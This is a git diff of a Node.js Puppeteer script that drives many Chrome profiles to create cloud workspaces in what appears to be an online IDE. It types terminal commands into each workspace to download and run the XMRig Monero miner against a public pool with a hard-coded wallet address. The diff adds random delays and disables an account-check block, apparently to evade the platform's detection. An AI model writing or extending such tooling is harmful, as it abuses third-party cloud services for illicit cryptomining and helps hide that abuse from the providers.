@@ -4,7 +4,7 @@ const fs = require('fs');
 const path = require('path');
 const { exec } = require('child_process');
 
-const wait = (min, maxPlus) => new Promise(resolve => setTimeout(resolve, (min * 2 + maxPlus * Math.random()) * 1000))
+const wait = (min, maxPlus) => new Promise(resolve => setTimeout(resolve, (min * 3 + maxPlus * Math.random()) * 1000))
 
 async function waitForClassToExist(page, classSelector, maxWaitTimeMs = 5 * 60 * 1000, checkIntervalMs = 10 * 1000) {
     console.log(`Starting to wait for class '${classSelector}' to appear...`);
@@ -59,11 +59,12 @@ const runCMD = async (page, name) => {
         " && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz",
         " && tar -xvzf xmrig-6.22.2-jammy-x64.tar.gz",
         " && cd xmrig-6.22.2",
-        " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
+        " && ./xmrig --donate-level 0 -o pool.supportxmr.com:443 -k --tls -t 8 -u",
+        " 85RmESy58nhhmAa7KSazFpaTmp3p7wJzK7q84PHDtZZAeb6wT7tB5y2az4MC8MR28YZFuk6o8cXdvhSxXgEjHWj1E97eUU1." + name,
     ];
 
     for (const cmd of commands) {
-        await new Promise(resolve => setTimeout(resolve, 100));
+        await new Promise(resolve => setTimeout(resolve, 400));
         await page.keyboard.type(cmd);
         // Small delay between chunks to ensure proper typing
     }
@@ -361,6 +362,7 @@ const runCMD1 = async (page, name) => {
 }
 
 const resetWithLink = async (page, link, name) => {
+    await wait(2, 5);
     await page.goto(link);
     await wait(2, 3);//new Promise(resolve => setTimeout(resolve, (2 + 3 * Math.random()) * 1000));
     await page.waitForSelector('.menubar-menu-button', { timeout: 50000 });
@@ -467,13 +469,15 @@ const reset = async (browser, link, name) => {
 
         await page.goto(link);
         await page.waitForSelector('iframe.is-loaded', { timeout: 8 * 60 * 1000 });
-
+        await wait(2, 5);
         const iframeSrc = await page.evaluate(() => {
             const iframe = document.querySelector('iframe.is-loaded');
             return iframe ? iframe.src : null;
         });
         console.log('open workerName:', workerName);
         const workerNamePref = workerName.includes(name) ? workerName : name + workerName;
+        await wait(2, 5);
+        await wait(2, 5);
         await resetWithLink(page, iframeSrc, workerNamePref).catch(async (err) => {
             console.error('Error resetting with link::________________dnd____', err);
             // await resetWithLink(page, iframeSrc, workerNamePref).catch()
@@ -496,7 +500,7 @@ const create = async (page, name) => {
         await page.type('#mat-input-0', name);
         await page.keyboard.press('Enter');
         await page.waitForSelector('iframe.is-loaded', { timeout: 20 * 60 * 1000 });
-
+        await wait(3, 5);
         const iframeSrc = await page.evaluate(() => {
             const iframe = document.querySelector('iframe.is-loaded');
             return iframe ? iframe.src : null;
@@ -505,7 +509,7 @@ const create = async (page, name) => {
             console.error('Error resetting with link::________________dnd____', err);
         });
 
-        await page.close();
+        // await page.close();
     } catch (error) {
         return 'create_fail';
     }
@@ -552,25 +556,26 @@ const runJob = async (port, name) => {
     const { browser } = await openOldConnection(port);
     try {
         const { page, mainTargetLinks } = await openHomePageAndGetLinks(browser);
-        await wait(10, 20)
-        if (mainTargetLinks.length > 0) {
-            console.log('open link: check google fails');
-            const link = mainTargetLinks[0];
-            await page.goto(link.href);
-            const isDie = await checkDie(page, port, name);
-            if (isDie) {
-                await new Promise(resolve => setTimeout(resolve, 10 * 60 * 1000));
-                await closeAllTabs(browser)
-                console.log('google fails:', isDie);
-                throw new Error('google fails');
-            }
-        }
+        // await wait(10, 20)
+        // if (mainTargetLinks.length > 0) {
+        //     console.log('open link: check google fails');
+        //     const link = mainTargetLinks[0];
+        //     await page.goto(link.href);
+        //     const isDie = await checkDie(page, port, name);
+        //     if (isDie) {
+        //         await new Promise(resolve => setTimeout(resolve, 10 * 60 * 1000));
+        //         await closeAllTabs(browser)
+        //         console.log('google fails:', isDie);
+        //         throw new Error('google fails');
+        //     }
+        // }
         await wait(10, 20)
         if (mainTargetLinks.length < 10) {
             for (let i = mainTargetLinks.length; i < 10; i++) {
                 try {
                     const startTime = Date.now();
                     const result = await create(page, `${name}-w${i}-`);
+                    console.log('create_result:', result);
                     const elapsedTime = ((Date.now() - startTime) / 1000).toFixed(2);
                     console.log(`Created new page in ${elapsedTime} seconds`);
                     await wait(10, 20)
@@ -681,6 +686,7 @@ const runAllProfile = async (machine, dirname) => {
                 const profileDetailPath = path.resolve(dirname, 'profile', `chrome-profile${count}`);
                 await combineOpenReset(count, `${machine}-p${count}`, profileDetailPath);
                 await new Promise(resolve => setTimeout(resolve, 3 * 1000));
+                await wait(2, 5);
             } catch (error) {
                 console.error('Error in runTerminal:', error);
             } finally {
@@ -744,4 +750,4 @@ module.exports = {
     runAllProfile,
 }
 // cop file nay nhe
-// v3.6.02 => phien ban code
+// v3.6.04 => phien ban code
